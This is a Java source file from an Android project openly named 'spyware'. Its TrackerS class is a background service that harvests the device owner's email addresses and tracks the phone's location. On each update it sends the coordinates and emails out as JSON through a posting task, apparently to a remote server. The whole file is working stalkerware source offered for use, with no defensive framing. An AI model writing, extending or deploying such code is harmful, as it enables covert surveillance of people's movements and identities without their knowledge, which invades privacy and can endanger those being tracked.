package android.spyware.services;

import android.app.Service;
import android.content.Intent;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.spyware.model.Position;
import android.spyware.utils.Harvester;
import android.spyware.utils.Parameter;
import android.spyware.utils.PostDataAT;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.util.Date;
import java.util.List;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class TrackerS extends Service {
    private LocationListener locationListener;
    private LocationManager  locationManager;
    private List<String>     email_addresses;

    @Override
    public void onCreate() {
        super.onCreate();

        if (DEV_MODE) {
            Log.i(TAG, TrackerS.class.getName() + "->setLocationListener:service started...");
        }

        Harvester harvester = new Harvester(TrackerS.this);
        this.email_addresses = harvester.getEmailAdresses();

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (DEV_MODE) {
                    Log.i(TAG, TrackerS.class.getName() + "->onLocationChanged:" + location);
                }

                Position position = new Position(location.getAccuracy(), location.getAltitude(), new Date(location.getTime()),
                                                 TrackerS.this.email_addresses, location.getLatitude(), location.getLongitude(),
                                                 location.getProvider()
                );

                Parameter                           params     = new Parameter("Tracker", position.toJSON());
                AsyncTask<Parameter, Void, Integer> postDataAT = new PostDataAT();

                postDataAT.execute(params);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                if (DEV_MODE) {
                    Log.v(TAG, TrackerS.class.getName() + "->onStatusChanged:" + provider.toUpperCase() + " - " + status);
                }
            }

            @Override
            public void onProviderDisabled(String provider) {
                if (DEV_MODE) {
                    Log.v(TAG, TrackerS.class.getName() + "->onProviderDisabled:" + provider.toUpperCase());
                }

                TrackerS.this.setLocationListener();
            }

            @Override
            public void onProviderEnabled(String provider) {
                if (DEV_MODE) {
                    Log.v(TAG, TrackerS.class.getName() + "->onProviderEnabled:" + provider.toUpperCase());
                }

                TrackerS.this.setLocationListener();
            }
        };

        this.setLocationListener();
    }

    private void setLocationListener() {
        if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") +
            ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") != 0) {
            Log.wtf(TAG, TrackerS.class.getName() + "->setLocationListener:insufficient permission");
        } else {
            Criteria criteria = new Criteria();

            if (this.locationManager.getBestProvider(criteria, true) != null) {
                long MIN_DISTANCE_CHANGE_FOR_UPDATES = 20;
                long MIN_TIME_BETWEEN_UPDATES        = 1000 * 60 * 30;

                this.locationManager.requestLocationUpdates(
                        this.locationManager.getBestProvider(criteria, true),
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE_FOR_UPDATES,
                        this.locationListener
                );
            } else {
                if (DEV_MODE) {
                    Log.wtf("::trace", TrackerS.class.getName() + "->setLocationListener:location providers all disabled");
                }
            }
        }
    }

    @Override
    public void onDestroy() {
        if (DEV_MODE) { Log.i(TAG, TrackerS.class.getName() + "->onDestroy:service terminated"); }

        if (locationManager != null) {
            locationManager.removeUpdates(locationListener);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
